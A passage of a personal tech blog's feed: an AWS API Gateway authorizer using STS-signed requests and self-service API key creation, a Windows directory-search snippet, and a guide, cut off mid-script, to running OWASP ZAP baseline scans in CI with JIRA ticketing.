    <span class="k">if</span> <span class="sh">'</span><span class="s">Arn</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">Account</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The sts data is missing bits</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">STS response not validated</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Authorized </span><span class="sh">"</span>  <span class="o">+</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">Arn</span><span class="sh">'</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">Username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">parts</span><span class="p">.</span><span class="nf">pop</span><span class="p">()</span>
    <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">Role</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="bp">None</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Account</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Account</span><span class="sh">'</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">authorized_accounts</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">That account is not authorized</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Role</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Role</span><span class="sh">'</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">authorized_roles</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">That role is not authorized</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">resource</span> <span class="o">=</span> <span class="n">event</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">methodArn</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="sh">'</span><span class="s">methodArn</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">event</span> <span class="k">else</span> <span class="n">event</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">routeArn</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span>
    	<span class="sh">"</span><span class="s">principalId</span><span class="sh">"</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">Username</span><span class="sh">'</span><span class="p">],</span>
    	<span class="sh">"</span><span class="s">policyDocument</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
    		<span class="sh">"</span><span class="s">Version</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">2012-10-17</span><span class="sh">"</span><span class="p">,</span>
    		<span class="sh">"</span><span class="s">Statement</span><span class="sh">"</span><span class="p">:</span> <span class="p">[</span>
    			<span class="p">{</span>
    				<span class="sh">"</span><span class="s">Action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">execute-api:Invoke</span><span class="sh">"</span><span class="p">,</span>
    				<span class="sh">"</span><span class="s">Effect</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Allow</span><span class="sh">"</span><span class="p">,</span>
    				<span class="sh">"</span><span class="s">Resource</span><span class="sh">"</span><span class="p">:</span> <span class="n">resource</span><span class="p">,</span>
    			<span class="p">}</span>
    		<span class="p">]</span>
    	<span class="p">},</span>
    	<span class="sh">"</span><span class="s">context</span><span class="sh">"</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span>
    <span class="p">}</span>
</code></pre></div></div>

<p><strong>x-audience</strong><br />
Signed requests support adding arbitrary headers. We pass on <code class="language-plaintext highlighter-rouge">x-audience</code> with the hostname of endpoint the client intends to provide the proof of identity. The endpoint needs to verify the <code class="language-plaintext highlighter-rouge">x-audience</code> matches the hostname it has been assigned to protect against replay attacks. Without this additional header, another service could accept a user’s proof of identity, pass it on to our service and then receive the user’s API key. However, the client signs this header and sets it to the value of the intended audience which is the same value as the hostname of the endpoint. This prevents the client from sending the proof of identity to a “bad acting endpoint” and have the request go all the way through. When our endpoint receives the request in from a “bad actor”, it will see the <code class="language-plaintext highlighter-rouge">x-audience</code> does not match it’s configured hostname (the client sets it to the bad actor’s hostname) and reject the request. If a client made a request with <code class="language-plaintext highlighter-rouge">x-audience</code> not matching the hostname of the endpoint, they would not be protected, ultimately it is up to the client to protect themselves. (This technique was directly inspired by Hashicorp Vault, check out the section on validation below)</p>

<h3 id="creating-the-api-key">Creating the API Key</h3>
<p>After the authorizer allows the request to continue on, the authorizer context will be passed on to the request lambda. The event will include the context <code class="language-plaintext highlighter-rouge">event['requestContext']['authorizer']</code> which you can then  be used to create an API Key in API Gateway.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">boto3</span>
<span class="kn">import</span> <span class="n">string</span> 
<span class="kn">import</span> <span class="n">random</span> 
<span class="kn">import</span> <span class="n">base64</span>

<span class="c1"># You should use secrets manager to generate randomness but alas this serves as an example
# aws secretsmanager get-random-password --password-length 32 --require-each-included-type --exclude-characters '"'@/\"'"' | jq -r ".RandomPassword"'
</span><span class="k">def</span> <span class="nf">generate_random</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">48</span><span class="p">):</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span>
                             <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">size</span><span class="p">))</span> 


<span class="k">def</span> <span class="nf">unauthorized</span><span class="p">(</span><span class="n">actor</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
            <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">You are not authorized for this</span><span class="sh">'</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">actor</span><span class="sh">'</span><span class="p">:</span> <span class="n">actor</span><span class="p">,</span>
        <span class="p">}),</span>
    <span class="p">}</span>


<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="c1"># Verify this is called with an authorizer in front
</span>    <span class="n">actor</span> <span class="o">=</span> <span class="n">event</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">requestContext</span><span class="sh">'</span><span class="p">,</span> <span class="p">{}).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">authorizer</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">actor</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">unauthorized</span><span class="p">(</span><span class="sh">'</span><span class="s">No authorizer</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="c1"># ... which provides us a username
</span>    <span class="n">username</span> <span class="o">=</span> <span class="n">actor</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">unauthorized</span><span class="p">(</span><span class="n">actor</span><span class="p">)</span>
    
    <span class="n">plan_id</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">'</span><span class="s">USAGE_PLAN</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">api_id</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">'</span><span class="s">API_ID</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">stages</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">'</span><span class="s">API_STAGES</span><span class="sh">'</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">strip</span><span class="p">()]</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="nf">client</span><span class="p">(</span><span class="sh">'</span><span class="s">apigateway</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">already_has_key</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">key_id</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">get_api_keys</span><span class="p">(</span>
            <span class="n">nameQuery</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
            <span class="n">includeValues</span><span class="o">=</span><span class="bp">False</span>
        <span class="p">)</span>
        <span class="n">items</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">items</span><span class="sh">'</span><span class="p">,</span> <span class="p">[])</span>
        <span class="n">already_has_key</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">items</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
        <span class="n">key_id</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">]</span> <span class="k">if</span> <span class="n">already_has_key</span> <span class="k">else</span> <span class="bp">None</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="n">err_string</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">\d</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">x</span><span class="sh">"</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">err</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="n">err_string</span><span class="p">})</span>
        <span class="p">}</span>

    <span class="k">if</span> <span class="n">already_has_key</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
                <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">You already generated an api key</span><span class="sh">"</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">key_id</span><span class="sh">'</span><span class="p">:</span> <span class="n">key_id</span><span class="p">,</span>
                <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
            <span class="p">})</span>
        <span class="p">}</span>

    <span class="n">key_value</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">generate_random</span><span class="p">()</span>
    <span class="n">key_value</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">key_value</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>    
        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">create_api_key</span><span class="p">(</span>
            <span class="n">name</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> 
            <span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Self service created key</span><span class="sh">'</span><span class="p">,</span> 
            <span class="n">enabled</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> 
            <span class="n">value</span><span class="o">=</span><span class="n">key_value</span><span class="p">,</span>
            <span class="n">stageKeys</span><span class="o">=</span><span class="p">[{</span><span class="sh">'</span><span class="s">restApiId</span><span class="sh">'</span><span class="p">:</span> <span class="n">api_id</span><span class="p">,</span> <span class="sh">'</span><span class="s">stageName</span><span class="sh">'</span><span class="p">:</span> <span class="n">s</span><span class="p">}</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">stages</span><span class="p">],</span>
            <span class="n">tags</span><span class="o">=</span><span class="p">{</span>
                <span class="sh">'</span><span class="s">SrcAccount</span><span class="sh">'</span><span class="p">:</span> <span class="n">actor</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Account</span><span class="sh">'</span><span class="p">),</span>
                <span class="sh">'</span><span class="s">Role</span><span class="sh">'</span><span class="p">:</span> <span class="n">actor</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Role</span><span class="sh">'</span><span class="p">),</span>
            <span class="p">}</span>
        <span class="p">)</span>
    
        <span class="n">client</span><span class="p">.</span><span class="nf">create_usage_plan_key</span><span class="p">(</span>
            <span class="n">usagePlanId</span><span class="o">=</span><span class="n">plan_id</span><span class="p">,</span>
            <span class="n">keyId</span><span class="o">=</span><span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">],</span>
            <span class="n">keyType</span><span class="o">=</span><span class="sh">'</span><span class="s">API_KEY</span><span class="sh">'</span><span class="p">)</span>    
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="n">err_string</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">\d</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">x</span><span class="sh">"</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">err</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="n">err_string</span><span class="p">})</span>
        <span class="p">}</span>

    <span class="k">return</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
            <span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">key_id</span><span class="sh">'</span><span class="p">:</span> <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">],</span>
            <span class="sh">'</span><span class="s">api_key</span><span class="sh">'</span><span class="p">:</span> <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">]</span>
        <span class="p">}),</span>
    <span class="p">}</span>
</code></pre></div></div>

<h2 id="validation">Validation</h2>
<p>If you are wondering if it is a good idea to use signed requests to STS as bearer proof of identity, you are not alone. I asked myself this same question, but it turns out Hashicorp Vault uses this same technique for authentication. That is where I discovered the pattern of adding additional headers for verification</p>

<ul>
  <li>https://www.youtube.com/watch?v=bCNSvUrK_BA&amp;list=WL&amp;index=2&amp;t=1377s</li>
</ul>

<p><small>
    Card icon by <a href="https://www.flaticon.com/authors/smashicons" title="Smashicons">Smashicons</a> from <a href="https://www.flaticon.com/" title="Flaticon">www.flaticon.com</a>
</small></p>]]></content><author><name></name></author><category term="cloud" /><category term="api" /><category term="aws" /><category term="cloud" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">find directory on windows</title><link href="http://ahermosilla.com/snippet/2020/08/12/snippet-find-dir-windows.html" rel="alternate" type="text/html" title="find directory on windows" /><published>2020-08-12T00:00:00+00:00</published><updated>2020-08-12T00:00:00+00:00</updated><id>http://ahermosilla.com/snippet/2020/08/12/snippet-find-dir-windows</id><content type="html" xml:base="http://ahermosilla.com/snippet/2020/08/12/snippet-find-dir-windows.html"><![CDATA[<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> \
<span class="nb">dir</span> <span class="kd">openssl</span> <span class="na">/AD /s
</span></code></pre></div></div>]]></content><author><name></name></author><category term="snippet" /><category term="cli" /><category term="windows" /><summary type="html"><![CDATA[cd \ dir openssl /AD /s]]></summary></entry><entry><title type="html">Setup ZAP baseline for CI &amp;amp; tracking with JIRA</title><link href="http://ahermosilla.com/security/2020/07/24/zap-baseline-with-jira.html" rel="alternate" type="text/html" title="Setup ZAP baseline for CI &amp;amp; tracking with JIRA" /><published>2020-07-24T00:00:00+00:00</published><updated>2020-07-24T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2020/07/24/zap-baseline-with-jira</id><content type="html" xml:base="http://ahermosilla.com/security/2020/07/24/zap-baseline-with-jira.html"><![CDATA[<p>Doing a baseline security scan of your web application before deployment is a simple way to improve the security of your application. Adding a scan to your CI as part of your SDLC makes it effortless to iterate and improve your application’s security. There are lots of options for scanning your web application, but in this post we’ll focus on scanning with <a href="https://www.zaproxy.org/">OWASP ZAP</a>! I’m going to walk through getting a basic scan setup and configured and then show how you can script up loading the results into <a href="https://www.atlassian.com/software/jira">JIRA</a>. I don’t get into configuration details of the CI, I’ve done this setup primarily with teams using Jenkins, but it translate well into any CI. (If you are using Github, there is a nice post on <a href="https://www.zaproxy.org/blog/2020-04-09-automate-security-testing-with-zap-and-github-actions/">ZAP with Github Actions</a>)</p>

<p><em>I put together the majority of this guide a couple years ago so some of the scripts haven’t been tested recently</em></p>

<h2 id="requirements">Requirements</h2>
<ul>
  <li>Docker</li>
  <li><code class="language-plaintext highlighter-rouge">jq</code>  <a href="https://stedolan.github.io/jq/">https://stedolan.github.io/jq/</a></li>
  <li><code class="language-plaintext highlighter-rouge">jira</code> (cli) <a href="https://github.com/Netflix-Skunkworks/go-jira">https://github.com/Netflix-Skunkworks/go-jira</a></li>
</ul>

<h2 id="prepare">Prepare</h2>
<p>You’ll need Docker installed on your system to try things out. When you are setup, you can execute this command to do a test run against your application  (Change the url to your application endpoint). The <code class="language-plaintext highlighter-rouge">alerts.json</code> will have a report of findings and <code class="language-plaintext highlighter-rouge">alerts.conf</code> is a config file (being generated this time with the <code class="language-plaintext highlighter-rouge">-g</code> flag) you can change (<a href="https://www.zaproxy.org/docs/docker/baseline-scan/">https://www.zaproxy.org/docs/docker/baseline-scan/</a>) - pay attention to stdout for now. There will be minimal output, running the command will take 30 seconds to 5 minutes depending on how many crawlable urls you have.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">--rm</span> <span class="nt">--env</span> <span class="nv">PYTHONBUFFERED</span><span class="o">=</span>1 <span class="se">\</span>
  <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/zap/wrk/:rw <span class="nt">-t</span> owasp/zap2docker-stable zap-baseline.py <span class="se">\</span>
  <span class="nt">-t</span> https://ahermosilla.com/ <span class="se">\</span>
  <span class="nt">-a</span> <span class="nt">-d</span> <span class="nt">-j</span> <span class="se">\</span>
  <span class="nt">-J</span> <span class="s2">"alerts.json"</span> <span class="se">\</span>
  <span class="nt">-g</span> alerts.conf <span class="se">\</span>
  <span class="nt">-m</span> 1 <span class="se">\</span>
  <span class="nt">-z</span> <span class="s1">'-config spider.maxDepth=1 -config spider.thread=4 -config spider.maxChildren=1'</span>
</code></pre></div></div>

<h2 id="review">Review</h2>
<p>After the command runs &amp; finishes you’ll see some results in stdout that look like the output below. Review the results &amp; make note of any items that may be false positives, noting the number in the square brackets after the label (e.g <code class="language-plaintext highlighter-rouge">[10010]</code>)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--- snip ---
PASS: WSDL File Passive Scanner [90030]
PASS: Loosely Scoped Cookie [90033]
WARN-NEW: Cookie No HttpOnly Flag [10010] x 13 
	https://ahermosilla.com/
	https://ahermosilla.com/account/login?return_url=https%3A%2F%2Fahermosilla.com
	https://ahermosilla.com/user/auth/login?return_url=https%3A%2F%2Fahermosilla.com
	https://ahermosilla.com/robots.txt
	https://ahermosilla.com/sitemap.xml
WARN-NEW: Cookie Without Secure Flag [10011] x 13 
	https://ahermosilla.com/
--- snip ---
</code></pre></div></div>

<h2 id="tune">Tune</h2>
<p>The scan from the first step will generate an  <code class="language-plaintext highlighter-rouge">alerts.conf</code> which you can tune.  You can change <code class="language-plaintext highlighter-rouge">WARN</code> to <code class="language-plaintext highlighter-rouge">IGNORE</code> for false positives or <code class="language-plaintext highlighter-rouge">WARN</code> to <code class="language-plaintext highlighter-rouge">FAIL</code> for items that you would want to fail builds for. Tuning is optional, but like most tools, you can get better mileage with tuning. Once you have altered the config, do some more test runs with the supplied config to verify the changes are what you want.</p>

<p><strong>alerts.conf</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># zap-baseline rule configuration file
# Change WARN to IGNORE to ignore rule or FAIL to fail if rule matches
# Only the rule identifiers are used - the names are just for info
# You can add your own messages to each rule by appending them after a tab on each line.
10009   WARN    (In Page Banner Information Leak)
10010   WARN    (Cookie No HttpOnly Flag)
10011   WARN    (Cookie Without Secure Flag)
10015   WARN    (Incomplete or No Cache-control and Pragma HTTP Header Set)
10016   WARN    (Web Browser XSS Protection Not Enabled)
10017   WARN    (Cross-Domain JavaScript Source File Inclusion)
10019   WARN    (Content-Type Header Missing)
10020   WARN    (X-Frame-Options Header Scanner)
10021   WARN    (X-Content-Type-Options Header Missing)
10023   WARN    (Information Disclosure - Debug Error Messages)
10024   WARN    (Information Disclosure - Sensitive Information in URL)
10025   WARN    (Information Disclosure - Sensitive Information in HTTP Referrer Header)
10026   WARN    (HTTP Parameter Override)
10027   WARN    (Information Disclosure - Suspicious Comments)
</code></pre></div></div>

<p>Now that you have adjusted the <code class="language-plaintext highlighter-rouge">alerts.conf</code> file, you 
 can run the command again, this time with the <code class="language-plaintext highlighter-rouge">-c</code>.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">--rm</span> <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/zap/wrk/:rw <span class="nt">-t</span> owasp/zap2docker-stable zap-baseline.py  <span class="se">\</span>
    <span class="nt">-t</span> https://ahermosilla.com/ <span class="se">\</span>
    <span class="nt">-a</span> <span class="nt">-d</span> <span class="nt">-j</span> <span class="se">\</span>
    <span class="nt">-J</span> <span class="s2">"alerts.json"</span> <span class="se">\</span>
    <span class="nt">-c</span> alerts.conf <span class="se">\</span>
    <span class="nt">-m</span> 1 <span class="se">\</span>
    <span class="nt">-z</span> <span class="s1">'-config spider.maxDepth=1 -config spider.thread=4 -config spider.maxChildren=1'</span>
</code></pre></div></div>

<h2 id="building">Building</h2>
<p>Once you have everything tuned &amp; verified, add a job to your CI environment. You should setup parameterized builds to pass in your target and alerts configuration. I recommend running the scans after acceptance testing, but find where it best fits into your team’s SDLC. This is essentially the script you can use.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">JIRA_PROJECT</span><span class="o">=</span>TST
<span class="nb">export </span><span class="nv">TARGET</span><span class="o">=</span><span class="s1">'https://ahermosilla.com/'</span>
<span class="nb">export </span><span class="nv">IGNORE_IDS</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>alerts.conf  | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^#'</span> | <span class="nb">grep </span>IGNORE | <span class="nb">cut</span> <span class="nt">-f1</span> | <span class="nb">tr</span> <span class="s1">'\r\n'</span> <span class="s1">' '</span><span class="si">)</span><span class="s2">"</span>
<span class="nb">export </span><span class="nv">REPORT_FILE</span><span class="o">=</span><span class="s2">"report-</span><span class="si">$(</span><span class="nb">date</span> <span class="s1">'+%Y%m%d%H%M%S'</span><span class="si">)</span><span class="s2">.json"</span>
 
docker run <span class="nt">--rm</span> <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/zap/wrk/:rw <span class="nt">-t</span> owasp/zap2docker-stable zap-baseline.py  <span class="se">\</span>
    <span class="nt">-t</span> <span class="s2">"</span><span class="nv">$TARGET</span><span class="s2">"</span> <span class="se">\</span>
    <span class="nt">-a</span> <span class="se">\</span>
    <span class="nt">-J</span> <span class="s2">"</span><span class="nv">$REPORT_FILE</span><span class="s2">"</span> <span class="se">\</span>
    <span class="nt">-c</span> alerts.conf <span class="se">\</span>
    <span class="nt">-m</span> 1 <span class="se">\</span>
    <span class="nt">-z</span> <span class="s1">'-config spider.maxDepth=1 -config spider.thread=4 -config spider.maxChildren=1'</span>

<span class="c"># Export alerts to JIRA</span>
./zap_alerts_to_jira.sh <span class="s2">"</span><span class="nv">$REPORT_FILE</span><span class="s2">"</span>
</code></pre></div></div>

<h2 id="jira">JIRA</h2>
<p>Everyone who has used JIRA has feelings about JIRA (myself included). This base script enables you to use the <code class="language-plaintext highlighter-rouge">jira</code> cli to create tickets from the alerts generated by ZAP. For teams that primarily work out of JIRA, this is very helpful for keeping tabs of any issues ZAP has found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">set</span> <span class="nt">-e</span>

<span class="nv">report_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">target_host</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
<span class="nv">project</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">JIRA_PROJECT</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">ignore_ids</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">IGNORE_IDS</span><span class="k">:-</span><span class="nv">2</span><span class="p"> 10026</span><span class="k">}</span><span class="s2">"</span>

<span class="c"># If ignore_ids is actually a file instead of numbers</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ignore_ids</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then</span>
  <span class="c"># https://github.com/zaproxy/zaproxy/wiki/ZAP-Baseline-Scan#configuration-file</span>
